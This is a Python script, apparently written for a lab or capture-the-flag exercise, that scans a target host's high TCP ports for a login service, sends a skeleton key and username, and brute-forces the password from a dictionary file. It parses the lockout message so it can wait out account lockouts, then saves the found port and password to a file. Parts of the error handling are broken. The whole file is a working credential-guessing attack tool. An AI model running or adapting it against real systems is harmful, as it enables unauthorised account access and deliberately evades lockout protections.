#!/usr/bin/env python3

"""
Usage of this tool is of the syntax <command> <target IP address> <skeletonkey>
<user> <dictionary>
"""
import socket
import sys
import string
import time

try:
    host = sys.argv[1]
    skeletonkey = sys.argv[2]
    user = sys.argv[3]
    dictionary = sys.argv[4] 
except Exception as e:
    print(e)

REJECTION = 'Too many failed login attempts, account is locked for the next 600 seconds, goodbye.\n'
PASSWORD = 'Password: '
CONFIRMATION = 'Command: '
PORT_BEGIN = 1025
PORT_END   = 65535
BUF = 1024
SLEEP = 0
T = 0

def blackout(s, sock):
    global T
    s = s.decode() 
    if(any(c.isdigit() for c in s)):
        s = s.replace('.', '')
        s = s.replace('\n', '')
        s = s.replace(' ', '')
        s = s.replace(',', '')
        T = int(s.strip(string.ascii_letters))
        if(isinstance(T, int)):
            global SLEEP
            SLEEP += 1
            T += 1 # allow a little extra time
            time.sleep(T)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
            sock.connect((host, port))
            sock.send(skeletonkey.encode())
            resp = sock.recv(BUF)
            sock.send(user.encode())
            resp = sock.recv(BUF)


def cracker(port):
    global SLEEP
    global T
    passw = ""
    i = 0
    for word in words:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:        
                sock.connect((host, port))
                sock.send(skeletonkey.encode())
                resp = sock.recv(BUF)
                sock.send(user.encode())
                resp = sock.recv(BUF)
                if(SLEEP == 0):
                    blackout(resp, sock)
                sock.send(word.encode())
                resp = sock.recv(BUF)
                sock.close()
                if (resp.decode() == CONFIRMATION):
                    passw = word
                    break
                i += 1
                if((i%3 == 0) and (SLEEP == 1)):
                    time.sleep(T)
                    sys.stdout.flush()
        except OSError as e:
            print('Unable to reach host: ', host, ', on port: ', port_begin)
            print(e)
            if e.errno == BrokenPipeError:
                sock.connect((host, port))
        except Exception as e:
            print(e)
    return passw


j = 0
k = 0
openPorts = []
port = None

for i in range(PORT_BEGIN, PORT_END + 1):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            if ((sock.connect_ex((host, i))) == 0):            
                openPorts.append(i)
                k += 1
                sys.stdout.flush()
    except ConnectionRefusedError:
        j += 1
    except OSError as e:
        print('Unable to reach host: ', host, ', on port: ', i)
        print(e)
    except Exception as e:
        print(e)
 

with open(dictionary, 'r') as data:
    words = data.read().splitlines()

for oport in openPorts:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((host, oport))
            sock.send(skeletonkey.encode())
            resp = sock.recv(BUF)
            sock.send(user.encode())
            uresp = sock.recv(BUF)
            if (uresp.decode() == PASSWORD or uresp.decode() == REJECTION):
                port = oport
                break
    except ConnectionRefusedError as e:
        print(e)
        if(e == None):
            continue
    except OSError as e:
        print('Unable to reach host: ', host, ', on port: ', oport)
        print(e)
        if e.errno == BrokenPipeError:
            sock.connect((host, oport))
    except Exception as e:
        print(e)


password = cracker(port)


with open('./pass.txt', 'w') as export:
    export.write(str(port) + '\n')
    export.write(password + '\n')

export.close()
data.close()
